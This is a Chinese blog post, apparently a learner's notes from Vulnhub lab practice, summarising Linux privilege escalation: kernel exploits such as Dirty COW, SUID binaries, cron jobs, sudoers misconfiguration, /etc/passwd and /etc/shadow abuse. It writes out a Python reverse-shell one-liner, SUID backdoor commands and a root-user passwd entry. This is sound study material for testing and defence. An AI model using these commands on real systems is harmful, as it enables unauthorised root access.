## 前言

之前，打靶场的时候一遇到提权就没思路了，为了避免以后比赛遇到这种情况，我决定对linux的提权方法进行一些总结。

## 正题

linux提权总共分大概六大类  
![图片.png](https://image.3001.net/images/20220402/1648886737_624803d15ba8ab88cca44.png!small)  
linux提权中，最常用的就是内核提权。除了数据库提权，别的遇见几率都很比较小。

### 内核提权

一般提权，大部分都是内核提权，但是通杀的内核提权漏洞几乎没有，所以我们在提权之前，要首先对目标服务器的内核进行一波信息收集。  
查看发行版本

    
    
    cat /etc/issue
    cat /etc/*-release
    

查看内核版本，

    
    
    uname -a
    

在正式介绍内核提权之前，我先介绍两个工具。

#### Linux-exploit-suggester

[Linux-exploit-suggester](https://github.com/mungurk/linux-exploit-suggester.sh)  
收集内核的信息，并且根据信息，筛选一些内核提权的漏洞。

#### Searchsploit

根据内核版本或者漏洞名称提供对应内核漏洞的EXP的本地地址，方便使用。  
使用方法：  
![图片.png](https://image.3001.net/images/20220402/1648886754_624803e2e5ae438321ff0.png!small)

#### 内核提权实战

这里，我使用的是[Vulnhub靶场Lampiao](https://download.vulnhub.com/lampiao/Lampiao.zip)里面有一个内核提权的漏洞，详细的渗透过程就不写了，只写一下内核提权相关。  
![图片.png](https://image.3001.net/images/20220402/1648886769_624803f18c8682d670c97.png!small)版本为`4.4.0-31
`2016年发行  
上传`Linux-exploit-suggester`  
`upload /tmp/linux-exploit-suggester.sh /tmp/1.sh`  
然后赋予777权限  
![图片.png](https://image.3001.net/images/20220402/1648886785_624804013319e6f9b9276.png!small)弹shell，执行1.sh  
![图片.png](https://image.3001.net/images/20220402/1648886795_6248040bcfa63b59229a1.png!small)可以看到，脏牛提权  
![图片.png](https://image.3001.net/images/20220402/1648886813_6248041d5e32fb67887e5.png!small)通过`searchsploit
`查找`dirty `相关的EXP  
![图片.png](https://image.3001.net/images/20220402/1648886876_6248045cd0a5763c9b842.png!small)复制`40847.cpp`文件到当前目录。  
![图片.png](https://image.3001.net/images/20220402/1648886863_6248044f014a993e0f654.png!small)将exp上传到靶机，并且编译运行  
`g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 1 1.cpp -lutil`  
![图片.png](https://image.3001.net/images/20220402/1648886891_6248046b20a6d5bbab1b3.png!small)然后运行`./1`即可拿到root`password`  
![图片.png](https://image.3001.net/images/20220402/1648886903_6248047726a2abb79c4ff.png!small)可以看到提权成功。别的内核提权和这次提权也大差不差，都是先对内核进行一波信息收集，然后根据内核版本，寻找对应的提权的方法。

### SUID提权

> SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行
> ，简单的说就是，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限 。

为文件附上这样的权限可以使用命令：`chmod u+s 或者chmod 4755 `  
可以使用如下poc 寻找符合要求的文件

    
    
    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;
    

![图片.png](https://image.3001.net/images/20220402/1648886919_62480487e1faf581168fa.png!small)这些二级制文件都是有SUID权限的，我们运行它，我们也会暂时拥有root权限。  
下面我们就用find做实。  
首先对find命令赋权，  
![图片.png](https://image.3001.net/images/20220402/1648886933_62480495d74a09cad4454.png!small)查看权限，  
![图片.png](https://image.3001.net/images/20220402/1648886943_6248049f46c3da116916b.png!small)提权成功，  
![图片.png](https://image.3001.net/images/20220402/1648886955_624804ab64c8d631c3b15.png!small)弹shell  
`find 1.txt -exec python -c "import
os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
\;`

当然，`vim、bash、less、more `均可以进行如上提权成功的案例，但是弹`shell`的命令可能不同。而且都要有`SUID`的权限。  
当`vim`拥有`SUID`的权限的时候，我们甚至能修改`/etc/shadow`等重要文件。  
![图片.png](https://image.3001.net/images/20220402/1648886967_624804b7b902c9037870e.png!small)  
`:set shell=/bin/sh `  
![图片.png](https://image.3001.net/images/20220402/1648886977_624804c18d88e1a0d06e9.png!small)  
`:shell `  
![图片.png](https://image.3001.net/images/20220402/1648886991_624804cf1ae5f54133b94.png!small)  
提权成功。  
![图片.png](https://image.3001.net/images/20220402/1648887008_624804e0a1839169c1447.png!small)为`bash`赋权之后，`bash`也能提权，  
![图片.png](https://image.3001.net/images/20220402/1648887032_624804f874a532fb24597.png!small)  
`less/more`提权，  
`!/bin/sh `  
![图片.png](https://image.3001.net/images/20220402/1648887046_624805066d479fbdd204c.png!small)提权成功，  
![图片.png](https://image.3001.net/images/20220402/1648887058_62480512ec198a2274015.png!small)  
`more`同理 。之后我就不一一列举了，这种虽然方便，但是一切建立在`SUID`的权限之上。  
其余的一些命令的提权可以参考这篇[文章](https://blog.csdn.net/zhangge3663/article/details/113879113)

### 计划任务提权

大概思路就是，对于可能存在的权限配置不当的有`root`权限的计划任务，使我们普通用户也拥有修改权限，我们修改其中的内容，为`bash、less、more`等赋予`SUID`权限，与`SUID`提权结合，使之提权成功。

>
> 系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出。

利用如下的命令可以列出一些计划任务。

    
    
    ls -l /etc/cron*
    
    cat /etc/crontab 
    

![图片.png](https://image.3001.net/images/20220402/1648887079_6248052738ab28997dff3.png!small)![图片.png](https://image.3001.net/images/20220402/1648887089_62480531cc7a8ad6441ab.png!small)这里我们如果遇到有权限配置为`777`即`-rwxrwxrwx`的计划任务，我们就可以对文件内容进行修改，进行提权。  
`cp /bin/bash /tmp/bash; chmod u+s /tmp/bash; `  
对`bash`赋予`SUID`权限。  
当然，如果对`vim、less、find`等命令赋权均可  
`cp /bin/vim /tmp/vim ; chmod u+s /tmp/vim; //为vim赋值`  
接下来等到任务执行即可。

### 配置错误导致提权

这里分享两个工具，可以帮助查找一些错误配置。  
 **unix-privesc-check** ：<http://pentestmonkey.net/tools/audit/unix-privesc-check>  
 **linuxprivchecker** ：
<https://www.securitysift.com/download/linuxprivchecker.py>  
![图片.png](https://image.3001.net/images/20220402/1648887105_6248054172872bcff788f.png!small)这两个工具不仅列出了配置问题，而且还会列出所有可写文件。  
当然想手撸错误配置的话参考<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>  
这里还是说个配置错误导致的提权吧。

###  **sudo提权**

一般情况下，如果普通用户想要提权到`root`权限使用`sudo`命令的话，都需要输入密码，但是，如果管理员为了方便登录和管理，对配置文件`/etc/sudoers`进行更改，使其`sudo`免密登录。  
添加：`liang ALL=(ALL:ALL) NOPASSWD:ALL //liang为我们指定的用户`  
![图片.png](https://image.3001.net/images/20220402/1648887122_62480552488a8e59288c4.png!small)![图片.png](https://image.3001.net/images/20220402/1648887136_62480560acdef6ceb6fba.png!small)可以看到，因为配置不当，`liang`这个用户使用`sudo`命令提权到`root`时，已经不需要密码了。

### 明文root密码提权

一般来说 ，linux的用户和密码
都和`/etc/passwd和/etc/shadow`这两个文件有关。`/etc/passwd`中存储的是用户，其中X代表密码`hash`被放在/`etc/shadow`文件中，并且`/etc/passwd`全用户可读。`/etc/shadow`中存储的就是密码的`hash`，只有root用户可读。

#### 对/etc/passwd文件有写权限。

使用工具`OpenSSL`加密密码。  
`openssl passwd -1 -salt laodou laodou`  
![图片.png](https://image.3001.net/images/20220402/1648887155_62480573a7753cdc738e6.png!small)

    
    
    echo 'laodou:$1$laodou$zDGbTCLR5TMxtmjARaxhQ1
    :0:0::/root:/bin/bash'  >>/etc/passwd
    

但是这个提权方法之前在`vulunhub靶场 AI WEB1`并没有使用成功。哪里做的错误的地方，还请师傅们斧正。

#### 对/etc/shadow文件有读权限。

当我们对`/etc/shadow`有读权限的时候，我们可以利用`hash、john`等工具对密码进行爆破。对与`join`工具的使用，这里就不详解了，可以参考[join工具使用](https://www.cnblogs.com/HelloCTF/p/13346125.html)。

### 第三方服务提权

第三方服务提权主要就数据库的提权。

#### 数据库提权

数据库提权又包括

    
    
    1.UDF提权
    
    2.MOF提权
    
    3.启动项提权
    
    4.CVE-2016-6663、CVE-2016-6664组合提权
    
    5.反弹端口提权 
    

因为本文主要写的是对linux提权的小结，这里便不再详述数据库提权了。

# 总结

对Linux提权总归是有个大概的了解了，并非一篇总结就等于我学会了Linux提权，积累才是最重要的。冲冲冲！！！

# 参考

<https://www.cnblogs.com/sfsec/p/15163907.html>  
<https://xz.aliyun.com/t/8139>  
<https://blog.csdn.net/devil8123665/article/details/107485260>  
<https://blog.csdn.net/weixin_47767605/article/details/106183044>  
<https://blog.csdn.net/zhangge3663/article/details/113879113>

